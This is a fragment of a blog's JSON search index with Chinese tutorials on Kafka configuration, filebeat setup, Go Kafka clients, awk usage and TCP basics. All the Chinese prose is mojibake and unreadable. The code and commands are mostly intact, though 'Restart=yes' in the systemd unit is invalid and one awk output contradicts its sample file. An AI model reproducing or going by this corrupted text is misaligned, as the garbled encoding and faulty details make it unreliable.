è·¯å¾„\n\nKafkaçš„dataç›®å½•æ˜¯å­˜å‚¨Kafkaçš„æ•°æ®æ–‡ä»¶çš„ç›®å½•ï¼Œæ˜¯åœ¨${KAFKA_HOME}/config/server.propertiesä¸­ä¿®æ”¹\n\n```bash\nlog.dirs=/data/kafka_data\n```\n\næ³¨æ„ï¼šlog.dirså¯ä»¥é…ç½®å¤šä¸ªç›®å½•ï¼Œéœ€è¦ç”¨é€—å·åˆ†éš”å¼€\n\n\n\n##### 1.4.3 å‘¨æœŸåˆ é™¤æ•°æ®\n\nsudo vi config/server.properties\n\n```Â bash\nlog.retention.minutes=3\nlog.retention.hours=1  # é€‰ä¸€ä¸ª\nlog.cleanup.policy=delete\n```\n\n\n\n# 2. filebeat\n\n### 2.1 å®‰è£…\n\n```bash\nwget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.12.1-linux-x86_64.tar.gz\ntar zxvf filebeat-7.12.1-linux-x86_64.tar.gz\ncd filebeat-7.12.1-linux-x86_64/\n```\n\n\n\n### 2.2 filebeat.yml\n\n```ini\nfilebeat.inputs:\n- type: log\n  enabled: true\n  paths:\n      - /DATA/log/nginx/pb_ptio.access.log\n  fields:\n        document_type: online-pingback\n\n\noutput.kafka:\n  hosts: [\"localhost:9092\"]\n  topic: 'pingback'\n  partition.round_robin:\n    reachable_only: false\n  compression: gzip\n\n\nprocessors:\n  - decode_json_fields:\n      fields: ['message']\n      target: \"\"\n      overwrite_keys: false\n      process_array: false\n      max_depth: 1\n  - decode_json_fields:\n      fields: ['request_body']\n      target: \"\"\n      overwrite_keys: false\n      process_array: false\n      max_depth: 3\n  - drop_fields:\n      fields: [\"message\"]\n```\n\n\n\n### 2.3 systemctl æœåŠ¡\n\n`vi /etc/systemd/system/filebeat.service`\n\n```ini\n[Unit]\nDescription=filebeat\nAfter=network.target\n[Service]\nType=simple\nRestart=yes\nExecStart=/opt/filebeat/filebeat -e -c /opt/filebeat/filebeat.yml\n[Install]\nWantedBy=multi-user.target\n```\n\n+ å¯åŠ¨\n\n  ```bash\n  systemctl start filebeat\n  ```\n\n\n\n# 3. golang è¯»å– kafka\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"flag\"\n\t\"log\"\n\t\"os\"\n\t\"os/signal\"\n\t\"strings\"\n\t\"sync\"\n\t\"syscall\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\n// Sarama configuration options\nvar (\n\tbrokers  = \"\"\n\tversion  = \"\"\n\tgroup    = \"\"\n\ttopics   = \"\"\n\tassignor = \"\"\n\toldest   = true\n\tverbose  = false\n)\n\nfunc init() {\n\tflag.StringVar(&brokers, \"brokers\", \"\", \"Kafka bootstrap brokers to connect to, as a comma separated list\")\n\tflag.StringVar(&group, \"group\", \"\", \"Kafka consumer group definition\")\n\tflag.StringVar(&version, \"version\", \"2.1.1\", \"Kafka cluster version\")\n\tflag.StringVar(&topics, \"topics\", \"\", \"Kafka topics to be consumed, as a comma separated list\")\n\tflag.StringVar(&assignor, \"assignor\", \"range\", \"Consumer group partition assignment strategy (range, roundrobin, sticky)\")\n\tflag.BoolVar(&oldest, \"oldest\", true, \"Kafka consumer consume initial offset from oldest\")\n\tflag.BoolVar(&verbose, \"verbose\", false, \"Sarama logging\")\n\tflag.Parse()\n\n\tif len(brokers) == 0 {\n\t\tpanic(\"no Kafka bootstrap brokers defined, please set the -brokers flag\")\n\t}\n\n\tif len(topics) == 0 {\n\t\tpanic(\"no topics given to be consumed, please set the -topics flag\")\n\t}\n\n\tif len(group) == 0 {\n\t\tpanic(\"no Kafka consumer group defined, please set the -group flag\")\n\t}\n}\n\nfunc main() {\n\tlog.Println(\"Starting a new Sarama consumer\")\n\n\tif verbose {\n\t\tsarama.Logger = log.New(os.Stdout, \"[sarama] \", log.LstdFlags)\n\t}\n\n\tversion, err := sarama.ParseKafkaVersion(version)\n\tif err != nil {\n\t\tlog.Panicf(\"Error parsing Kafka version: %v\", err)\n\t}\n\n\t/**\n\t * Construct a new Sarama configuration.\n\t * The Kafka cluster version has to be defined before the consumer/producer is initialized.\n\t */\n\tconfig := sarama.NewConfig()\n\tconfig.Version = version\n\n\tswitch assignor {\n\tcase \"sticky\":\n\t\tconfig.Consumer.Group.Rebalance.Strategy = sarama.BalanceStrategySticky\n\tcase \"roundrobin\":\n\t\tconfig.Consumer.Group.Rebalance.Strategy = sarama.BalanceStrategyRoundRobin\n\tcase \"range\":\n\t\tconfig.Consumer.Group.Rebalance.Strategy = sarama.BalanceStrategyRange\n\tdefault:\n\t\tlog.Panicf(\"Unrecognized consumer group partition assignor: %s\", assignor)\n\t}\n\n\tif oldest {\n\t\tconfig.Consumer.Offsets.Initial = sarama.OffsetOldest\n\t}\n\n\t/**\n\t * Setup a new Sarama consumer group\n\t */\n\tconsumer := Consumer{\n\t\tready: make(chan bool),\n\t}\n\n\tctx, cancel := context.WithCancel(context.Background())\n\tclient, err := sarama.NewConsumerGroup(strings.Split(brokers, \",\"), group, config)\n\tif err != nil {\n\t\tlog.Panicf(\"Error creating consumer group client: %v\", err)\n\t}\n\n\twg := &sync.WaitGroup{}\n\twg.Add(1)\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor {\n\t\t\t// `Consume` should be called inside an infinite loop, when a\n\t\t\t// server-side rebalance happens, the consumer session will need to be\n\t\t\t// recreated to get the new claims\n\t\t\tif err := client.Consume(ctx, strings.Split(topics, \",\"), &consumer); err != nil {\n\t\t\t\tlog.Panicf(\"Error from consumer: %v\", err)\n\t\t\t}\n\t\t\t// check if context was cancelled, signaling that the consumer should stop\n\t\t\tif ctx.Err() != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tconsumer.ready = make(chan bool)\n\t\t}\n\t}()\n\n\t<-consumer.ready // Await till the consumer has been set up\n\tlog.Println(\"Sarama consumer up and running!...\")\n\n\tsigterm := make(chan os.Signal, 1)\n\tsignal.Notify(sigterm, syscall.SIGINT, syscall.SIGTERM)\n\tselect {\n\tcase <-ctx.Done():\n\t\tlog.Println(\"terminating: context cancelled\")\n\tcase <-sigterm:\n\t\tlog.Println(\"terminating: via signal\")\n\t}\n\tcancel()\n\twg.Wait()\n\tif err = client.Close(); err != nil {\n\t\tlog.Panicf(\"Error closing client: %v\", err)\n\t}\n}\n\n// Consumer represents a Sarama consumer group consumer\ntype Consumer struct {\n\tready chan bool\n}\n\n// Setup is run at the beginning of a new session, before ConsumeClaim\nfunc (consumer *Consumer) Setup(sarama.ConsumerGroupSession) error {\n\t// Mark the consumer as ready\n\tclose(consumer.ready)\n\treturn nil\n}\n\n// Cleanup is run at the end of a session, once all ConsumeClaim goroutines have exited\nfunc (consumer *Consumer) Cleanup(sarama.ConsumerGroupSession) error {\n\treturn nil\n}\n\n// ConsumeClaim must start a consumer loop of ConsumerGroupClaim's Messages().\nfunc (consumer *Consumer) ConsumeClaim(session sarama.ConsumerGroupSession, claim sarama.ConsumerGroupClaim) error {\n\t// NOTE:\n\t// Do not move the code below to a goroutine.\n\t// The `ConsumeClaim` itself is called within a goroutine, see:\n\t// https://github.com/Shopify/sarama/blob/master/consumer_group.go#L27-L29\n\tfor message := range claim.Messages() {\n\t\tlog.Printf(\"Message claimed: value = %s, timestamp = %v, topic = %s\", string(message.Value), message.Timestamp, message.Topic)\n\t\tsession.MarkMessage(message, \"\")\n\t}\n\n\treturn nil\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.liuvv.com/p/f03714cc.html\n+ https://blog.csdn.net/u010889616/article/details/80640330\n+ https://birdben.github.io/2016/12/15/Kafka/Kafka%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89%E6%8C%87%E5%AE%9AKafka%E7%9A%84data%E5%92%8Clogs%E8%B7%AF%E5%BE%84/\n+ https://blog.csdn.net/qq_41926119/article/details/104510481\n+ https://github.com/Shopify/sarama\n","tags":["filebeat"],"categories":["elk"]},{"title":"awkçš„ä½¿ç”¨","url":"%2Fp%2Feb6cbd19.html","content":"\nAWK æ˜¯ä¸€ç§å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„ç¼–ç¨‹è¯­è¨€ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ã€‚ä¹‹æ‰€ä»¥å« AWK æ˜¯å› ä¸ºå…¶å–äº†ä¸‰ä½åˆ›å§‹äºº Alfred Ahoï¼ŒPeter Weinberger, å’Œ Brian Kernighan çš„ Family Name çš„é¦–å­—ç¬¦ã€‚\n\ngrep ã€sedã€awk è¢«ç§°ä¸º linux ä¸­çš„â€ä¸‰å‰‘å®¢â€ã€‚grep æ›´é€‚åˆå•çº¯çš„æŸ¥æ‰¾æˆ–åŒ¹é…æ–‡æœ¬ï¼Œ sed æ›´é€‚åˆç¼–è¾‘åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œ awk æ›´é€‚åˆæ ¼å¼åŒ–æ–‡æœ¬ï¼Œå¯¹æ–‡æœ¬è¿›è¡Œè¾ƒå¤æ‚æ ¼å¼å¤„ç†ã€‚\n\n<!-- more -->\n\n# 1. ä½¿ç”¨\n\n### 1.1 åˆ†å‰²å­—ç¬¦\n\n```bash\necho 'this is a test' | awk '{print $0}'\n\nthis is a test\n```\n\nprint æ˜¯æ‰“å°å‘½ä»¤ï¼Œ$0 ä»£è¡¨å½“å‰è¡Œå…¨éƒ¨å­—æ®µã€‚ä¸Šé¢ä»£ç ä¸­ï¼Œ`print $0` å°±æ˜¯æŠŠæ ‡å‡†è¾“å…¥ `this is a test`ï¼Œé‡æ–°æ‰“å°äº†ä¸€éã€‚\n\nawk ä¼šæ ¹æ®ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ï¼Œå°†æ¯ä¸€è¡Œåˆ†æˆè‹¥å¹²å­—æ®µï¼Œä¾æ¬¡ç”¨ $1ã€$2ã€$3 ä»£è¡¨ç¬¬ä¸€ä¸ªå­—æ®µã€ç¬¬äºŒä¸ªå­—æ®µã€ç¬¬ä¸‰ä¸ªå­—æ®µç­‰ç­‰ã€‚\n\n```bash\necho 'this is a test' | awk '{print $3}'\n\na\n```\n\nä¸‹é¢ï¼Œä¸ºäº†ä¾¿äºä¸¾ä¾‹ï¼Œæˆ‘ä»¬æŠŠ/etc/passwd æ–‡ä»¶ä¿å­˜æˆ demo.txtã€‚\n\n```json\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n```\n\nè¿™ä¸ªæ–‡ä»¶çš„å­—æ®µåˆ†éš”ç¬¦æ˜¯å†’å·ï¼ˆ:ï¼‰ï¼Œæ‰€ä»¥è¦ç”¨ -F å‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ä¸ºå†’å·ã€‚ç„¶åï¼Œæ‰èƒ½æå–åˆ°å®ƒçš„ç¬¬ä¸€ä¸ªå­—æ®µã€‚\n\n```bash\nawk -F ':' '{ print $1 }' demo.txt\nawk -v FS=':' '{print $1}' demo.txt\ncat demo.txt  | awk -F ':' '{print $1}'\n\n\nroot\ndaemon\nbin\nsys\nsync\n```\n\n### 1.2 å˜é‡ä½¿ç”¨\n\n##### 1.2.1 NF å­—æ®µ\n\nå˜é‡ NF è¡¨ç¤ºå½“å‰è¡Œæœ‰å¤šå°‘ä¸ªå­—æ®µï¼Œå› æ­¤ **$NF å°±ä»£è¡¨æœ€åä¸€ä¸ªå­—æ®µ**ã€‚\n\n```bash\n\n# è¾“å‡ºå€’æ•°ç¬¬ä¸€ä¸ªå­—æ®µ\necho 'this is a test' | awk '{print $NF}'\ntest\n\n# è¾“å‡ºå€’æ•°ç¬¬äºŒä¸ªå­—æ®µ\necho 'this is a test' | awk '{print $(NF-1)}'\na\n\n# print å‘½ä»¤é‡Œé¢çš„é€—å·ï¼Œè¡¨ç¤ºè¾“å‡ºçš„æ—¶å€™ï¼Œä¸¤ä¸ªéƒ¨åˆ†ä¹‹é—´ä½¿ç”¨ç©ºæ ¼åˆ†éš”ã€‚\nawk -F ':' '{print $1, $(NF-1)}' demo.txt\nroot /root\ndaemon /usr/sbin\nbin /bin\nsys /dev\nsync /bin\n```\n\n##### 1.2.2 NR è¡Œ\n\nå˜é‡ NR è¡¨ç¤ºå½“å‰å¤„ç†çš„æ˜¯ç¬¬å‡ è¡Œã€‚\n\n```bash\n# print å‘½ä»¤é‡Œé¢ï¼Œå¦‚æœåŸæ ·è¾“å‡ºå­—ç¬¦ï¼Œè¦æ”¾åœ¨åŒå¼•å·é‡Œé¢ã€‚\nawk -F ':' '{print NR \") \" $1}' demo.txt\n\n\n1) root\n2) daemon\n3) bin\n4) sys\n5) sync\n```\n\n##### 1.2.3 å¸¸ç”¨å†…ç½®å˜é‡\n\n```json\nFILENAMEï¼šå½“å‰æ–‡ä»¶å\nFSï¼šå­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ã€‚\nRSï¼šè¡Œåˆ†éš”ç¬¦ï¼Œç”¨äºåˆ†å‰²æ¯ä¸€è¡Œï¼Œé»˜è®¤æ˜¯æ¢è¡Œç¬¦ã€‚\nOFSï¼šè¾“å‡ºå­—æ®µçš„åˆ†éš”ç¬¦ï¼Œç”¨äºæ‰“å°æ—¶åˆ†éš”å­—æ®µï¼Œé»˜è®¤ä¸ºç©ºæ ¼ã€‚\nORSï¼šè¾“å‡ºè®°å½•çš„åˆ†éš”ç¬¦ï¼Œç”¨äºæ‰“å°æ—¶åˆ†éš”è®°å½•ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ã€‚\nOFMTï¼šæ•°å­—è¾“å‡ºçš„æ ¼å¼ï¼Œé»˜è®¤ä¸ºï¼….6gã€‚\n```\n\n### 1.3 å‡½æ•°ä½¿ç”¨\n\n##### 1.3.1 Toupper\n\n```bash\n# å‡½æ•° `toupper()` ç”¨äºå°†å­—ç¬¦è½¬ä¸ºå¤§å†™ã€‚\nawk -F ':' '{ print toupper($1) }' demo.txt\n\nROOT\nDAEMON\nBIN\nSYS\nSYNC\n```\n\n##### 1.3.2 å¸¸ç”¨å†…ç½®å‡½æ•°\n\n```json\n//å¸¸ç”¨å‡½æ•°ï¼š\ntolower()ï¼šå­—ç¬¦è½¬ä¸ºå°å†™ã€‚\nlength()ï¼šè¿”å›å­—ç¬¦ä¸²é•¿åº¦ã€‚\nsubstr()ï¼šè¿”å›å­å­—ç¬¦ä¸²ã€‚\nsin()ï¼šæ­£å¼¦ã€‚\ncos()ï¼šä½™å¼¦ã€‚\nsqrt()ï¼šå¹³æ–¹æ ¹ã€‚\nrand()ï¼šéšæœºæ•°ã€‚\n```\n\n### 1.4 æ¡ä»¶ä½¿ç”¨\n\n`awk` å…è®¸æŒ‡å®šè¾“å‡ºæ¡ä»¶ï¼Œåªè¾“å‡ºç¬¦åˆæ¡ä»¶çš„è¡Œã€‚è¾“å‡ºæ¡ä»¶è¦å†™åœ¨åŠ¨ä½œçš„å‰é¢ã€‚\n\n```bash\nawk 'æ¡ä»¶ åŠ¨ä½œ' æ–‡ä»¶å\n```\n\n```bash\n# print å‘½ä»¤å‰é¢æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œåªè¾“å‡ºåŒ…å« usr çš„è¡Œã€‚\nawk -F ':' '/usr/ {print $1}' demo.txt  \n\nroot\ndaemon\nbin\nsys\n\n\n# è¾“å‡ºå¥‡æ•°è¡Œ\nawk -F ':' 'NR % 2 == 1 {print $1}' demo.txt \n\nroot\nbin\nsync\n\n# è¾“å‡ºç¬¬ä¸‰è¡Œä»¥åçš„è¡Œ\nawk -F ':' 'NR >3 {print $1}' demo.txt \n\nsys\nsync\n\n# è¾“å‡ºç¬¬ä¸€ä¸ªå­—æ®µç­‰äºæŒ‡å®šå€¼çš„è¡Œã€‚\nawk -F ':' '$1 == \"root\" || $1 == \"bin\" {print $0}' demo.txt\n\nroot:x:0:0:root:/root:/bin/bash\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\n```\n\n### 1.5 If è¯­å¥\n\nawk æä¾›äº† if ç»“æ„ï¼Œç”¨äºç¼–å†™å¤æ‚çš„æ¡ä»¶ã€‚\n\n```bash\n# è¾“å‡ºç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§äº`m`çš„è¡Œã€‚\nawk -F ':' '{if ($1 > \"m\") print $1}' demo.txt\n\nroot\nsys\nsync\n\n\n# `if`ç»“æ„è¿˜å¯ä»¥æŒ‡å®š`else`éƒ¨åˆ†ã€‚\nawk -F ':' '{if ($1 > \"m\") print $1; else print \"---\"}' demo.txt\n\nroot\n---\n---\nsys\nsync\n```\n\n### 1.6 å¾ªç¯ä½¿ç”¨\n\nEND çš„æ„æ€æ˜¯â€œå¤„ç†å®Œæ‰€æœ‰çš„è¡Œçš„æ ‡è¯†â€ï¼Œé™¤äº† END è¿˜æœ‰ BEGINï¼Œè¿™ä¸¤ä¸ªå…³é”®å­—æ„å‘³ç€æ‰§è¡Œå‰å’Œæ‰§è¡Œåçš„æ„æ€ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š\n\n```bash\n# è®¡ç®—å¤šä¸ªæ–‡ä»¶çš„å¤§å°\nls -l  *.log\n-rw-rw-r-- 1 web web 42487 Nov 12  2021 openfiles1111.log\n-rw-rw-r-- 1 web web  2690 Nov 12  2021 openfiles1112.log\n\n\nls -l  *.log | awk '{sum+=$5} END {print sum}'\n45177\n\n\n\n# å¾ªç¯è®¡ç®—å†…å­˜\nps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.3  0.0 171948 11688 ?        Ss    2022 1087:09 /lib/systemd/systemd --system --deserialize 29\nroot           2  0.0  0.0      0     0 ?        S     2022   0:36 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<    2022   0:00 [rcu_gp]\nroot           4  0.0  0.0      0     0 ?        I<    2022   0:00 [rcu_par_gp]\n\n\nps aux | awk 'NR!=1{a[$1]+=$6;} END { for(i in a) print i \", \" a[i]\"KB\";}'\n\nsystemd+, 179468KB\nubuntu, 176548KB\nweb, 1073020KB\nmessage+, 6484KB\nsyslog, 4728KB\nmongodb, 407824KB\nredis, 19880KB\nconsul, 47884KB\ngrafana, 71188KB\nnobody, 4116KB\nwww-data, 69308KB\nuuidd, 1032KB\nmysql, 1420364KB\ndaemon, 2180KB\nroot, 4716836KB\n\n```\n\n# 2. Awk è„šæœ¬\n\n### 2.1 æ‰§è¡Œé€»è¾‘\n\n```bash\nawk 'BEGIN{ commands } pattern{ commands } END{ commands }'\n```\n\nBEGIN è¯­å¥å—åœ¨ awk å¼€å§‹ä»è¾“å…¥æµä¸­è¯»å–è¡Œä¹‹å‰è¢«æ‰§è¡Œï¼Œè¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„è¯­å¥å—ï¼Œæ¯”å¦‚å˜é‡åˆå§‹åŒ–ã€æ‰“å°è¾“å‡ºè¡¨æ ¼çš„è¡¨å¤´ç­‰è¯­å¥é€šå¸¸å¯ä»¥å†™åœ¨ BEGIN è¯­å¥å—ä¸­ã€‚\n\nEND è¯­å¥å— åœ¨ awk ä»è¾“å…¥æµä¸­è¯»å–å®Œæ‰€æœ‰çš„è¡Œ ä¹‹å å³è¢«æ‰§è¡Œï¼Œæ¯”å¦‚æ‰“å°æ‰€æœ‰è¡Œçš„åˆ†æç»“æœè¿™ç±»ä¿¡æ¯æ±‡æ€»éƒ½æ˜¯åœ¨ END è¯­å¥å—ä¸­å®Œæˆï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå¯é€‰è¯­å¥å—ã€‚\n\npattern è¯­å¥å—ä¸­çš„é€šç”¨å‘½ä»¤æ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå®ƒä¹Ÿæ˜¯å¯é€‰çš„ã€‚å¦‚æœæ²¡æœ‰æä¾› pattern è¯­å¥å—ï¼Œåˆ™é»˜è®¤æ‰§è¡Œ{ print }ï¼Œå³æ‰“å°æ¯ä¸€ä¸ªè¯»å–åˆ°çš„è¡Œï¼Œawk è¯»å–çš„æ¯ä¸€è¡Œéƒ½ä¼šæ‰§è¡Œè¯¥è¯­å¥å—ã€‚\n\n```bash\necho -e \"A line 1\\nA line 2\" | awk 'BEGIN{ print \"Start\" } { print } END { print \"End\" }'\n\n\nStart\nA line 1\nA line 2\nEnd\n```\n\n### 2.2 å°†å¤–éƒ¨å˜é‡å€¼ä¼ é€’ç»™ awk\n\nå€ŸåŠ© -v é€‰é¡¹ï¼Œå¯ä»¥å°†å¤–éƒ¨å€¼ï¼ˆå¹¶éæ¥è‡ª stdinï¼‰ä¼ é€’ç»™ awkï¼š\n\n```bash\nVAR=10000\necho | awk -v VARIABLE=$VAR '{ print VARIABLE }'\n\n10000\n```\n\nå¦ä¸€ç§ä¼ é€’å¤–éƒ¨å˜é‡æ–¹æ³•ï¼šå˜é‡ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ä½œä¸º awk çš„å‘½ä»¤è¡Œå‚æ•°è·Ÿéšåœ¨ BEGINã€{}å’Œ END è¯­å¥å—ä¹‹åã€‚\n\n```bash\nvar1=\"aaa\"\nvar2=\"bbb\"\necho | awk '{ print v1,v2 }' v1=$var1 v2=$var2\n\naaa bbb\n```\n\n### 2.3 æµ‹è¯•\n\n```bash\n# æŸ¥çœ‹3306çš„ pid\nnetstat -anp | grep 3306  | awk '$NF != \"-\" {print $NF}' | awk -F '/' '{print $1}'\n\n\n# ä»æ–‡ä»¶ä¸­æ‰¾å‡ºé•¿åº¦å¤§äº80çš„è¡Œ:\nawk 'length>80' demo.txt\n\n```\n\n# 3. å‚è€ƒèµ„æ–™\n\n- https://www.ruanyifeng.com/blog/2018/11/awk.html\n- https://coolshell.cn/articles/9070.html\n- https://wangchujiang.com/linux-command/c/awk.html\n- https://www.w3cschool.cn/awk/c2li1k8d.html\n- https://www.zsythink.net/archives/1336\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"kafkaå®‰è£…å’Œgolangå®æˆ˜","url":"%2Fp%2Ff03714cc.html","content":"\n# 1.  å®‰è£…å’Œä½¿ç”¨\n\n### 1.1 macå®‰è£…\n\n```bash\n# å¦‚æœæŠ¥é”™ï¼Œæç¤ºå®‰è£… java, å®‰è£…å³å¯\nbrew install kafka  \n\n# å…ˆå¯åŠ¨ zookeeper, å†å¯åŠ¨ kafaka\nzookeeper-server-start /usr/local/etc/kafka/zookeeper.properties && kafka-server-start /usr/local/etc/kafka/server.properties  \n\n# æ­¤æ—¶ç”¨ ps æŸ¥çœ‹è¿›ç¨‹å¯ä»¥çœ‹åˆ°æ˜¯ç”¨ java èµ·æ¥çš„ã€‚\n```\n\n<!-- more -->\n\n### 1.2 ä½¿ç”¨\n\n+ åˆ›å»ºTopic\n\n```bash\nkafka-topics --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n```\n\n+ ç”Ÿäº§æ¶ˆæ¯\n\n```bash\nkafka-console-producer --broker-list localhost:9092 --topic test\n```\n\n+ æ¶ˆè´¹æ¶ˆæ¯\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --from-beginning\n```\n\n+ ä½¿ç”¨æ¶ˆè´¹ç»„æ¶ˆè´¹\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --group test-consumer1 --from-beginning\n```\n\n# 2.  golang ä½¿ç”¨ kafka\n\ngithub ä¸Šæœ‰å¤šä¸ªè½®å­,é€‰ç”¨äº†staræœ€å¤šçš„ sarama\n\n+ https://github.com/Shopify/sarama \n+ https://github.com/confluentinc/confluent-kafka-go\n+ https://github.com/segmentio/kafka-go\n\n### 2.1 ç”Ÿäº§è€…\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconfig := sarama.NewConfig()\n\tconfig.Producer.RequiredAcks = sarama.WaitForAll          // å‘é€å®Œæ•°æ®éœ€è¦leaderå’Œfollowéƒ½ç¡®è®¤\n\tconfig.Producer.Partitioner = sarama.NewRandomPartitioner // æ–°é€‰å‡ºä¸€ä¸ªpartition\n\tconfig.Producer.Return.Successes = true                   // æˆåŠŸäº¤ä»˜çš„æ¶ˆæ¯å°†åœ¨success channelè¿”å›\n\n\t// è¿æ¥kafka\n\tclient, err := sarama.NewSyncProducer([]string{\"127.0.0.1:9092\"}, config)\n\tif err != nil {\n\t\tfmt.Println(\"producer closed, err:\", err)\n\t\treturn\n\t}\n\tdefer client.Close()\n\t\n\t// å‘é€æ¶ˆæ¯\n\tmsg := &sarama.ProducerMessage{}\n\tmsg.Topic = \"web_log\"\n\tmsg.Value = sarama.StringEncoder(\"this is a test log1\")\n\tpid, offset, err := client.SendMessage(msg)\n\tif err != nil {\n\t\tfmt.Println(\"send msg failed, err:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"pid:%v offset:%v\\n\", pid, offset)\n}\n\n\n```\n\n### 2.2 æ¶ˆè´¹è€…\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconsumer, err := sarama.NewConsumer([]string{\"localhost:9092\"}, nil)\n\tif err != nil {\n\t\tfmt.Printf(\"fail to start consumer, err:%v\\n\", err)\n\t\treturn\n\t}\n\n\t// å–å‡ºè€çš„å€¼\n\toldest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetOldest)\n\tdefer oldest.AsyncClose()\n\tfor msg := range oldest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n\t\n\t// æ¶ˆè´¹æ–°å¢åŠ çš„å€¼\n\tnewest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetNewest)\n\tdefer newest.AsyncClose()\n\tfor msg := range newest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n}\n```\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://colobu.com/2019/09/27/install-Kafka-on-Mac/\n+ https://tonybai.com/2022/03/28/the-comparison-of-the-go-community-leading-kakfa-clients/\n+ https://cloud.tencent.com/developer/article/1541215\n","tags":["kafka"],"categories":["æ¶ˆæ¯é˜Ÿåˆ—"]},{"title":"tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹","url":"%2Fp%2F289c4599.html","content":"\n# 1. tcp å’Œ udp\n\n![1](tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹/1.png)\n\n|          | UDP                                       | TCP                                                          |\n| -------- | ----------------------------------------- | ------------------------------------------------------------ |\n| æ•°æ®ä¼ è¾“ | æ•°æ®ä¼ è¾“                                  | 3æŠ¥æ–‡æ¡æ‰‹+æ•°æ®ä¼ è¾“+4æŠ¥æ–‡æŒ¥æ‰‹                                 |\n| è¿æ¥æ–¹å¼ | å•æ’­(ä¸€å¯¹ä¸€), å¤šæ’­(ä¸€å¯¹å¤š), å¹¿æ’­ (ä¸€å¯¹å…¨) | å•æ’­(ä¸€å¯¹ä¸€)                                                 |\n| åº”ç”¨æŠ¥æ–‡ | æ¯ä¸ªæŠ¥æ–‡æ·»åŠ ä¸ªUDPé¦–éƒ¨                     | ä¸€ç³»åˆ—å­—èŠ‚æµæ”¾åˆ°ç¼“å­˜ä¸­, é€šè¿‡æ»‘åŠ¨çª—å£ç­–ç•¥å‘é€<br>å‘é€æ–¹åŠ ä¸ª TCP å¤´éƒ¨<br>æ¥æ”¶æ–¹å–å‡ºå­—èŠ‚æµ,ç»„åˆé€ç»™æ¥æ”¶æ–¹è¿›ç¨‹ |\n| é¦–éƒ¨     | 8å­—èŠ‚                                     | æœ€å°20å­—èŠ‚, æœ€å¤§60å­—èŠ‚                                       |\n\n<!-- more -->\n\n### 1.1 tcp  socket æ¨¡å‹\n\n<img src=\"tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹/12-TCPç¼–ç¨‹æ¨¡å‹-20230906163252432.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 1.2 udp socket æ¨¡å‹\n\n<img src=\"tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹/13-UDPç¼–ç¨‹æ¨¡å‹-20230906163308157.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 1.3 tcp å¤´éƒ¨å­—æ®µ\n\n##### 1. å¤´éƒ¨æ ¼å¼\n\n20å­—èŠ‚å›ºå®š  + æœ€å¤§40å­—èŠ‚æ‰©å±•\n\n##### 2. å›ºå®š20å­—èŠ‚è¯¦æƒ…\n\n- [x] æºç«¯å£ 2å­—èŠ‚,  ç›®çš„ç«¯å£ 2å­—èŠ‚\n\n- [x] åºå· 4å­—èŠ‚ , æˆ‘å‘é€çš„æ˜¯ä»¥ n å¼€å§‹çš„åºå·\n\n- [x] ç¡®è®¤å· 4å­—èŠ‚, ä¹‹å‰çš„éƒ½å·²ç»æ¥æ”¶,ä¸‹æ¬¡å¸Œæœ›ç»™æˆ‘ä¼ é€’ n,  ACKä½ç½®å¿…é¡»=1\n\n- [x] 